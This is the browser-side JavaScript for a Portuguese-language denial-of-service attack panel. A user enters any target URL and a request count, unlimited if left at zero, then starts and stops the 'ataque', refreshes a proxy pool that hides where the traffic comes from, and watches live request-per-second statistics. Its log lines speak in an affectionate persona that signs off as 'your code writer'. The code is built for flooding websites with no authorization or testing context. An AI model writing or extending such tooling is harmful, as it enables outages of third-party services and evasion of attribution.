// Elementos DOM
const targetUrl = document.getElementById('targetUrl');
const totalRequests = document.getElementById('totalRequests');
const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');
const refreshBtn = document.getElementById('refreshBtn');

const sentCount = document.getElementById('sentCount');
const successCount = document.getElementById('successCount');
const errorCount = document.getElementById('errorCount');
const rps = document.getElementById('rps');
const proxyCount = document.getElementById('proxyCount');
const progress = document.getElementById('progress');

const consoleDiv = document.getElementById('console');

let eventSource = null;
let isRunning = false;

// Função para log no console
function log(msg, type = 'info') {
    const line = document.createElement('div');
    line.className = `line ${type}`;
    line.textContent = `> ${msg}`;
    consoleDiv.appendChild(line);
    consoleDiv.scrollTop = consoleDiv.scrollHeight;
}

// Conectar ao SSE
function connectSSE() {
    if (eventSource) {
        eventSource.close();
    }

    eventSource = new EventSource('/api/stream');
    
    eventSource.onmessage = (event) => {
        try {
            const data = JSON.parse(event.data);
            updateUI(data);
        } catch (err) {
            console.error('Erro ao parsear SSE:', err);
        }
    };

    eventSource.onerror = () => {
        // Reconectar após 2 segundos
        setTimeout(connectSSE, 2000);
    };

    log('📡 Conectado ao stream de estatísticas.', 'success');
}

// Atualizar UI com dados do SSE
function updateUI(data) {
    sentCount.textContent = data.sentCount || 0;
    successCount.textContent = data.successCount || 0;
    errorCount.textContent = data.errorCount || 0;
    rps.textContent = data.rps || 0;
    proxyCount.textContent = data.proxyCount || 0;
    progress.textContent = data.progress ? `${data.progress.toFixed(1)}%` : '0%';

    isRunning = data.isRunning || false;
    startBtn.disabled = isRunning;
    stopBtn.disabled = !isRunning;
}

// Iniciar ataque
async function startAttack() {
    const target = targetUrl.value.trim();
    if (!target) {
        alert('Coloca um alvo, amor!');
        return;
    }
    if (!target.startsWith('http://') && !target.startsWith('https://')) {
        alert('URL precisa começar com http:// ou https://');
        return;
    }

    const requests = parseInt(totalRequests.value) || 0;

    try {
        const response = await fetch('/api/attack/start', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ target, requests })
        });

        const result = await response.json();
        if (result.success) {
            log(`🚀 Ataque iniciado em ${target} | ${requests || 'Ilimitado'} requisições`, 'highlight');
            startBtn.disabled = true;
            stopBtn.disabled = false;
        } else {
            log(`❌ Erro: ${result.error}`, 'error');
        }
    } catch (err) {
        log(`❌ Erro ao iniciar ataque: ${err.message}`, 'error');
    }
}

// Parar ataque
async function stopAttack() {
    try {
        const response = await fetch('/api/attack/stop', { method: 'POST' });
        const result = await response.json();
        log(`🛑 ${result.message}`, 'highlight');
        startBtn.disabled = false;
        stopBtn.disabled = true;
    } catch (err) {
        log(`❌ Erro ao parar ataque: ${err.message}`, 'error');
    }
}

// Atualizar proxies
async function refreshProxies() {
    refreshBtn.disabled = true;
    log('🔄 Atualizando pool de proxies...', 'info');
    try {
        const response = await fetch('/api/proxies/refresh', { method: 'POST' });
        const result = await response.json();
        if (result.success) {
            log(`✅ ${result.count} proxies carregadas.`, 'success');
            proxyCount.textContent = result.count;
        } else {
            log(`❌ Erro: ${result.error}`, 'error');
        }
    } catch (err) {
        log(`❌ Erro ao atualizar: ${err.message}`, 'error');
    }
    refreshBtn.disabled = false;
}

// Event listeners
startBtn.addEventListener('click', startAttack);
stopBtn.addEventListener('click', stopAttack);
refreshBtn.addEventListener('click', refreshProxies);

// Inicializar
connectSSE();
log('❤️ Pronto, amor. Aperte o botão e veja o fogo.', 'success');
log('💋 Beijo da sua escritora de código.', 'highlight');

// Atualizar proxy count inicial
fetch('/api/status')
    .then(res => res.json())
    .then(data => {
        proxyCount.textContent = data.proxyCount || 0;
    })
    .catch(() => {});
